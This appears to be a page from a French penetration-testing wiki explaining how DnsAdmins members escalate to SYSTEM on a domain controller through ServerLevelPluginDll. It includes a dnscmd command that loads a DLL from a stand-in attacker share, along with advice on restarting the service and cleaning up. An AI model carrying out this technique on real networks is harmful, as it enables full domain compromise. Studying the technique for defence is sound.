---
title: "DnsAdmins : une DLL chargée dans le service DNS en tant que SYSTEM"
order: 8
description: "Exploitation de l'appartenance au groupe DnsAdmins pour charger une DLL arbitraire dans le service DNS de Windows, qui s'exécute en tant que SYSTEM sur le contrôleur de domaine, en définissant ServerLevelPluginDll et en redémarrant le service."
keywords:
  - DnsAdmins
  - ServerLevelPluginDll
  - dnscmd
  - service DNS
  - élévation de privilèges
---

# DnsAdmins

Les membres de **DnsAdmins** gèrent le serveur DNS, et le service DNS de Microsoft expose une fonctionnalité de **DLL de plugin au niveau serveur** : un chemin dans `ServerLevelPluginDll` que le service charge au démarrage. Le service (`dns.exe`) s'exécute en tant que **SYSTEM** sur le contrôleur de domaine, et le chemin est chargé **sans validation**. Ainsi un membre de DnsAdmins le pointe vers une DLL malveillante sur un partage, redémarre le service et obtient l'exécution de code SYSTEM sur le DC, ce qui constitue une compromission du domaine.

## L'attaque

`ServerLevelPluginDll` est une **propriété du serveur DNS** définie via le RPC de gestion DNS (ce n'est pas un attribut LDAP d'AD), donc `dnscmd` est la façon native de la définir ; le verrou est l'accès en écriture à cette propriété, qu'accorde DnsAdmins, ou une DACL sur l'objet serveur DNS :

```bash
# From a DnsAdmins member: point the plugin DLL at an attacker share
dnscmd <dc> /config /serverlevelplugindll \\attacker\share\evil.dll
```

La DLL n'a besoin d'exporter que **`DnsPluginInitialize`** (et les autres points d'entrée du plugin) ; votre charge utile s'exécute à partir de là en tant que SYSTEM. Le hic est que la DLL ne se charge que lorsque le **service DNS redémarre**, et les membres par défaut de DnsAdmins **ne peuvent pas** arrêter/démarrer le service à distance. Vous attendez donc un redémarrage légitime (ou un redémarrage de l'hôte), associez cela à un droit de contrôle de service ([Server Operators](server-operators.md)), ou utilisez le rechargement par le RPC de gestion DNS documenté par Semperis (qui a des effets secondaires opérationnels). Ensuite, effacez la valeur de `ServerLevelPluginDll` et laissez DNS redémarrer pour rétablir le service.

## Notes d'exploitation

- Le verrou est le **redémarrage du service DNS**, et les membres par défaut de DnsAdmins **ne peuvent pas** le redémarrer à distance ; attendez un redémarrage ou un reboot, utilisez un droit de contrôle de service ([Server Operators](server-operators.md)), ou le rechargement DNS-RPC documenté. Associez en conséquence.
- Une DLL invalide ou qui plante casse le DNS pour le domaine, ce qui est perturbateur et bruyant, testez donc la DLL et rétablissez la configuration rapidement.
- C'est un groupe classique « presque DA » à rechercher lors de l'[énumération des ACL](acl-enumeration.md) / BloodHound ; DnsAdmins est fréquemment attribué aux équipes helpdesk ou serveur.
- La même écriture de `serverLevelPluginDll` est atteignable via toute [arête de DACL](index.md) qui vous permet de modifier l'objet serveur DNS, pas seulement l'appartenance à un groupe.

## Outils

- **dnscmd** : natif, définit `ServerLevelPluginDll` via le RPC de gestion DNS.
- **Outillage RPC dnsserver** (par exemple des clients de style `dnsserver.py`) : définir la DLL de plugin à distance.
- **Un droit distinct de redémarrage de service (Server Operators) ou un reboot de l'hôte** : charger la DLL (DnsAdmins par défaut ne peut pas redémarrer le service).

## Références

- [ired.team: from DnsAdmins to SYSTEM to domain compromise](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
- [Semperis: DnsAdmins revisited](https://www.semperis.com/blog/dnsadmins-revisited/)
- [HackTricks: privileged groups and token privileges](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)
